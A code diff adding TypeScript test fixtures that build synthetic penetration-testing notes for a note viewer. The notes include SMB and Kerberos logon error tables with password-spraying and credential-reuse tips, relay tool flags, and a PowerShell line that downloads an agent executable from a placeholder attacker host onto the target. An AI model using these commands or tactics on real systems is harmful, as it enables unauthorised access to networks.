@@ -558,3 +558,187 @@ export const FIXTURES: AuditFixtures = {
 };
 
 export const FIXTURE_PROGRESS = progress;
+
+// ---------------------------------------------------------------- Manual notes
+
+/**
+ * Synthetic Field Manual notes (relative path, file text) for the Manual. Invented wording throughout; addresses are
+ * RFC 5737 and names end in example.test. Shapes cover the real range: a long note with six tables (one five columns
+ * wide with long cells), a tool page whose commands carry placeholders, a note with every link kind, short filler notes
+ * so the rail is as full as a real import's.
+ */
+export const AUDIT_NOTE_IDS = {
+  long: "fnd-zz-status-codes",
+  tool: "tool-zz-scanner",
+  links: "fnd-zz-protocol",
+  report: "rep-zz-finding",
+} as const;
+
+const fm = (id: string, title: string, type: string) => `---\nid: ${id}\ntitle: ${title}\ntype: ${type}\n---\n`;
+
+const STATUS_ROWS: [string, string, string, string, string][] = [
+  ["0xC0000022", "STATUS_ACCESS_DENIED", "The account authenticated but holds no right to the share or pipe it asked for.", "A valid low-privilege user against an admin-only share such as C$ or ADMIN$ on zzfs01.example.test.", "List shares with the same account and read the ones it can; keep the credential, it works."],
+  ["0xC000006D", "STATUS_LOGON_FAILURE", "The name or the secret is wrong, or the account is not known to the target at all.", "A typo in the domain part, a local account tried as a domain one, or a stale hash.", "Try the account as local (--local-auth), then check the domain name on the DC."],
+  ["0xC000006E", "STATUS_ACCOUNT_RESTRICTION", "The secret is right, but a policy blocks this kind of logon.", "Blank passwords over the network, or Protected Users blocking NTLM.", "Use Kerberos instead of NTLM, or log on interactively where the policy allows it."],
+  ["0xC0000071", "STATUS_PASSWORD_EXPIRED", "The secret is right and has expired.", "Old service accounts in a lab that nobody logged on to for months.", "Change it with smbpasswd or kpasswd, then note the new value in Credentials."],
+  ["0xC0000072", "STATUS_ACCOUNT_DISABLED", "The secret is right; the account is switched off.", "Leavers kept for audit, decoy accounts.", "Keep the secret: it is often reused by an enabled sibling account."],
+  ["0xC0000234", "STATUS_ACCOUNT_LOCKED_OUT", "Too many failures: the account is locked for the lockout window.", "A spray without a delay, or another tester's spray on the same lab.", "Stop spraying that account; read the lockout policy before the next round."],
+  ["0xC00000CC", "STATUS_BAD_NETWORK_NAME", "The share name does not exist on that host.", "A share listed on a sibling host, or a trailing space in the name.", "List shares again and copy the name exactly, quotes included."],
+  ["0xC0000203", "STATUS_USER_SESSION_DELETED", "The server closed the session mid-way.", "SMB signing required while the client sends unsigned packets.", "Retry with signing on, or pick a tool that signs by default."],
+  ["0xC0000225", "STATUS_NOT_FOUND", "The named pipe or object is not there.", "A service that is stopped, so its pipe never opened, such as `\\\\zzfs01.example.test\\pipe\\zz-agent`.", "Check the service state over RPC before blaming the credential."],
+  ["0xC000015B", "STATUS_LOGON_TYPE_NOT_GRANTED", "The account may not log on this way on this host.", "Deny network logon for local accounts by group policy.", "Use the account where it is allowed, such as RDP or WinRM if those are granted."],
+];
+
+const KERBEROS_ROWS: [string, string, string][] = [
+  ["KDC_ERR_PREAUTH_FAILED", "Wrong password for a real account", "The name exists: keep it for spraying later."],
+  ["KDC_ERR_C_PRINCIPAL_UNKNOWN", "No such account", "Drop the name from the list."],
+  ["KDC_ERR_CLIENT_REVOKED", "Locked or disabled", "Stop; the account is out of play for now."],
+  ["KRB_AP_ERR_SKEW", "Clocks more than five minutes apart", "Sync the clock with the DC, then retry."],
+  ["KDC_ERR_ETYPE_NOSUPP", "The encryption type is not allowed", "Ask for AES instead of RC4."],
+];
+
+const NORMAL_ROWS: [string, string, string, string][] = [
+  ["Port 445 open, 139 closed", "Yes", "Direct SMB without NetBIOS", "Nothing to do"],
+  ["Null session lists shares", "No, on a modern host", "Anonymous access left on", "Read every share it lists"],
+  ["Signing not required", "Common on member servers", "Relay is possible", "Note it for the report"],
+  ["Guest account enabled", "No", "A weak default left on", "Try guest with an empty password"],
+];
+
+const RELAY_FLAGS: [string, string][] = [
+  ["-s *", "Listen on every address the host has, so the relay answers on the lab network and on loopback alike; narrow it to one address when another service already holds the port there."],
+  ["-m MODE", "The relay mode. The default forwards each request to the program it starts, unchanged; the other modes rewrite the request first, which some older targets refuse outright."],
+  ["-o \"OPTIONS\"", "Options passed through to that program, quoted as one value. Anything with a space in it needs the quotes, or the relay reads the second word as a flag of its own and stops."],
+  ["-n PORT", "The local port the relay listens on. Pick one the target can reach back to; a closed port here looks exactly like a failed relay in the output, so check it first."],
+  ["-g {GUID}", "The class identifier of the object to ask for. Leave it unset to try the built-in list in order, which is slower but works on most builds without any lookup beforehand."],
+];
+
+function longNote(): string {
+  const L: string[] = [];
+  L.push("# Zz Status Codes", "");
+  L.push("What a failed logon is telling you, read before you change the credential. Every code below comes back from a real protocol step; the table says what it means and what to try next.", "");
+  L.push("## Core concept", "");
+  L.push("A logon fails for one of three reasons: the name, the secret, or the policy. The code tells you which one, so read it before you try anything else.", "");
+  L.push("- **Name**: the account is not known where you asked.", "- **Secret**: the name is known and the secret is wrong.", "- **Policy**: both are right and something forbids this logon.", "");
+  L.push("See [[Zz-Protocol#How it works|how the exchange works]] for the packets behind each step.", "");
+  L.push("## SMB and NTLM", "");
+  L.push("**Table 1 — SMB / NTLM status codes**", "");
+  L.push("| Code | Name | What it means | Usual cause | What to try next |", "|---|---|---|---|---|");
+  for (const r of STATUS_ROWS) L.push(`| \`${r[0]}\` | \`${r[1]}\` | ${r[2]} | ${r[3]} | ${r[4]} |`);
+  L.push("");
+  L.push("### Reading the code", "");
+  L.push("The code is in the reply to the session setup. Most tools print the name; some print only the number.", "");
+  L.push("```text title:\"Example reply\"", "SMB  192.0.2.44  445  ZZFS01  [-] zz.example.test\\zzuser:Winter2026 STATUS_LOGON_FAILURE", "```", "");
+  L.push("## Kerberos", "");
+  L.push("**Table 2 — Kerberos errors** (zzkerb prints `KDC_ERR_*` codes with a hex value)", "");
+  L.push("| Error | Means | Do |", "|---|---|---|");
+  for (const r of KERBEROS_ROWS) L.push(`| \`${r[0]}\` | ${r[1]} | ${r[2]} |`);
+  L.push("");
+  L.push("## Is this normal?", "");
+  L.push("**Table 3 — Is this normal?**", "");
+  L.push("| You see | Normal? | Why | Do |", "|---|---|---|---|");
+  for (const r of NORMAL_ROWS) L.push(`| ${r[0]} | ${r[1]} | ${r[2]} | ${r[3]} |`);
+  L.push("");
+  L.push("## Decision tree", "");
+  L.push("1. Read the code.", "2. Name problem: fix the name or the domain part.", "3. Secret problem: try the next secret, slowly.", "4. Policy problem: change how you log on, not what you log on with.", "");
+  // Cases: enough worked examples that the note runs past 300 lines, as the owner's longest notes do.
+  for (let i = 1; i <= 14; i++) {
+    L.push(`### Case ${i}: zzhost${String(i).padStart(2, "0")}.example.test`, "");
+    L.push(`The tester tried a domain account against 192.0.2.${40 + i} and read the reply below. Work out which of the three reasons it was before reading on.`, "");
+    L.push("```text", `SMB  192.0.2.${40 + i}  445  ZZHOST${String(i).padStart(2, "0")}  [-] zz.example.test\\zzsvc${i}:Spring2026 ${STATUS_ROWS[i % STATUS_ROWS.length][1]}`, "```", "");
+    L.push(`It was a ${["name", "secret", "policy"][i % 3]} problem. ${STATUS_ROWS[i % STATUS_ROWS.length][2]}`, "");
+    L.push(`- What fixed it: ${STATUS_ROWS[i % STATUS_ROWS.length][4]}`, `- What did not: trying the same secret again.`, "");
+  }
+  L.push("## Status codes in the report", "");
+  L.push("**Table 4 — Wording for the report**", "");
+  L.push("| Seen | Write |", "|---|---|");
+  L.push("| `STATUS_ACCESS_DENIED` on a share | The account could authenticate but could not read the share. |");
+  L.push("| `STATUS_ACCOUNT_LOCKED_OUT` | Testing locked the account; the client was told at the time. |");
+  L.push("");
+  L.push("**Table 5 — Quick lookup**", "");
+  L.push("| Number | Name |", "|---|---|");
+  for (const r of STATUS_ROWS) L.push(`| \`${r[0]}\` | ${r[1]} |`);
+  L.push("");
+  // A key-column table: short flags, some with a space inside, next to long descriptions with room to spare.
+  L.push("**Table 6 — Zzrelay flags**", "");
+  L.push("| Flag | Does |", "|---|---|");
+  for (const r of RELAY_FLAGS) L.push(`| \`${r[0]}\` | ${r[1]} |`);
+  L.push("");
+  L.push("## Related", "", "- [[Zz-Protocol]]", "- [[Zz-Scanner]]", "");
+  return L.join("\n");
+}
+
+const TOOL_NOTE = [
+  "# Zz Scanner",
+  "A synthetic scanner used to show filled commands. Every command fills from the host in view.",
+  "",
+  "## Usage",
+  "",
+  "```bash title:\"Kali: scan the host\"",
+  "zzscan -t {TARGET_IP} -p 1-65535 --rate 2000 -o zzscan-{TARGET_IP}.txt",
+  "```",
+  "",
+  "```bash title:\"Kali: authenticated scan\"",
+  "zzscan -t {TARGET_IP} -u '{USER}' -p '{PASS}' -d {DOMAIN} --shares --sessions",
+  "```",
+  "",
+  "```powershell title:\"Target: fetch the agent\"",
+  "iwr http://{LHOST}:{LPORT}/zz-agent.exe -OutFile C:\\Windows\\Temp\\zz-agent.exe",
+  "```",
+  "",
+  "## Output",
+  "",
+  "```text",
+  "ZZSCAN  192.0.2.44  445/tcp open  microsoft-ds",
+  "ZZSCAN  192.0.2.44  5985/tcp open  wsman",
+  "```",
+  "",
+  "**Table 1 — Flags**",
+  "",
+  "| Flag | Meaning |",
+  "|---|---|",
+  "| `-t` | Target address or range |",
+  "| `-u`, `-p` | Name and secret for an authenticated scan |",
+  "| `--rate` | Packets per second; drop it on a slow lab link |",
+  "",
+  "### Tips",
+  "",
+  "- Read [[Zz-Status-Codes]] when a logon fails.",
+  "- The [[Port-Scanning]] card has the full scan sequence.",
+  "",
+].join("\n");
+
+const LINKS_NOTE = [
+  "# Zz Protocol",
+  "How a synthetic protocol exchange works, and where to read on.",
+  "",
+  "## How it works",
+  "",
+  "The client asks, the server answers with a code. The codes are in [[Zz-Status-Codes]]; the [[Zz-Status-Codes#Decision tree|decision tree]] says what to do with each one.",
+  "",
+  "Kerberos is the other half: the [[Kerberos-Enumeration]] card lists the commands, and [[Zz-Not-In-Vault]] is a page that does not exist yet.",
+  "",
+  "## Failure modes",
+  "",
+  "| Failure | Read |",
+  "|---|---|",
+  "| Wrong secret | [[Zz-Status-Codes#Kerberos]] |",
+  "| Clock skew | [[Kerberos-Enumeration\\|the card]] |",
+  "| Unknown | [[Zz-Another-Missing-Page]] |",
+  "",
+].join("\n");
+
+const FILLER: [string, string][] = [
+  ["04-Foundations", "Name Resolution Order"], ["04-Foundations", "Ports at a Glance"], ["04-Foundations", "Tokens and Privileges"],
+  ["04-Foundations", "Hash Formats"], ["04-Foundations", "Shells and TTYs"], ["04-Foundations", "Web Request Anatomy"],
+  ["03-Tools", "Zz Mapper"], ["03-Tools", "Zz Relay"], ["03-Tools", "Zz Cracker"], ["03-Tools", "Zz Fuzzer"], ["03-Tools", "Zz Tunnel"],
+  ["03-Tools", "Zz Shell Catcher"], ["03-Tools", "Zz Share Browser"], ["03-Tools", "Zz Directory Walker With A Long Page Title"],
+  ["05-Reporting", "Writing Remediation"], ["05-Reporting", "Severity Ratings"],
+];
+
+export const AUDIT_NOTE_SOURCES: [string, string][] = [
+  ["04-Foundations/Zz-Status-Codes.md", fm(AUDIT_NOTE_IDS.long, "Zz Status Codes", "foundation") + longNote()],
+  ["03-Tools/Zz-Scanner.md", fm(AUDIT_NOTE_IDS.tool, "Zz Scanner", "tool") + TOOL_NOTE],
+  ["04-Foundations/Zz-Protocol.md", fm(AUDIT_NOTE_IDS.links, "Zz Protocol", "foundation") + LINKS_NOTE],
+  ["05-Reporting/Zz-Finding-Template.md", fm(AUDIT_NOTE_IDS.report, "Zz Finding Template", "reporting") + "# Zz Finding Template\n## Structure\nTitle, impact, evidence, fix.\n"],
+  ...FILLER.map(([dir, title]): [string, string] => [`${dir}/${title.replace(/ /g, "-")}.md`, `# ${title}\nA short synthetic note.\n## Summary\nTwo lines of invented text.\n`]),
+];
